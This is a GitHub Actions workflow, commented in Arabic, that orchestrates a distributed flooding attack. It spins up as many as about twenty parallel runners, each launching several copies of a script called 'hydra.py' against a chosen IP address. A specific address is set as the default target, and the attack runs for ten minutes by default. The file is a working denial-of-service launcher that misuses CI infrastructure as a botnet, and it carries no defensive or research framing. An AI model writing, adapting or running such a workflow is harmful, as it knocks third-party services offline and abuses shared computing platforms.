# اسم الـ Workflow: Final Assault (v22 - The Lesson Learned)
name: Final Assault (v22)

on:
  workflow_dispatch:
    inputs:
      target_ip:
        description: 'Target IP Address'
        required: true
        default: '63.246.154.12'
      duration:
        description: 'Attack Duration (seconds)'
        required: true
        default: '600'
      swarm_size:
        description: 'Swarm Size (Number of Machines, max ~20)'
        required: true
        default: '20'
      concurrency_per_machine:
        description: 'Concurrency per Machine (Number of processes)'
        required: true
        default: '10'

jobs:
  # المهمة الأولى: إنشاء مصفوفة الهجوم بشكل آمن
  generate_attack_matrix:
    runs-on: ubuntu-latest
    outputs:
      matrix: ${{ steps.set-matrix.outputs.matrix }}
    steps:
      - name: Generate Swarm Matrix
        id: set-matrix
        run: |
          SIZE=${{ github.event.inputs.swarm_size }}
          MATRIX="{\"include\":["
          for (( i=1; i<=$SIZE; i++ )); do
            MATRIX+="{\"instance_id\":$i},"
          done
          MATRIX=$(echo $MATRIX | sed 's/,$//')
          MATRIX+="]}"
          echo "Generated Matrix: $MATRIX"
          echo "matrix=$MATRIX" >> $GITHUB_OUTPUT

  # المهمة الثانية: إطلاق الهجوم بناءً على المصفوفة الصحيحة
  unleash_assault_cell:
    needs: generate_attack_matrix
    runs-on: ubuntu-latest
    
    # --- هذا هو الإصلاح النهائي ---
    # استخدام المصفوفة التي تم إنشاؤها مسبقًا بشكل آمن
    strategy:
      fail-fast: false
      matrix: ${{ fromJson(needs.generate_attack_matrix.outputs.matrix) }}

    steps:
      - uses: actions/checkout@v3
      - uses: actions/setup-python@v3
        with:
          python-version: 3.9

      - name: Prepare Environment
        id: prepare
        run: |
          sed -i "s/TARGET_IP = .*/TARGET_IP = \"${{ github.event.inputs.target_ip }}\"/" hydra.py
          sed -i "s/DURATION = .*/DURATION = ${{ github.event.inputs.duration }}/" hydra.py
          
          TIMEOUT_MINS=$(( (${{ github.event.inputs.duration }} / 60) + 5 ))
          echo "timeout=$TIMEOUT_MINS" >> $GITHUB_OUTPUT

      - name: LAUNCH ASSAULT CELL #${{ matrix.instance_id }}
        timeout-minutes: ${{ fromJson(steps.prepare.outputs.timeout) }}
        run: |
          echo "Assault Cell #${{ matrix.instance_id }} | Launching ${{ github.event.inputs.concurrency_per_machine }} processes..."
          
          for i in $(seq 1 ${{ github.event.inputs.concurrency_per_machine }}); do
            echo "Launching process $i on cell #${{ matrix.instance_id }}..."
            python3 -u hydra.py &
          done
          
          echo "All processes launched. Cell #${{ matrix.instance_id }} is now at maximum pressure. Waiting for all processes to complete..."
          # wait هو أمر bash ينتظر انتهاء جميع العمليات في الخلفية
          wait
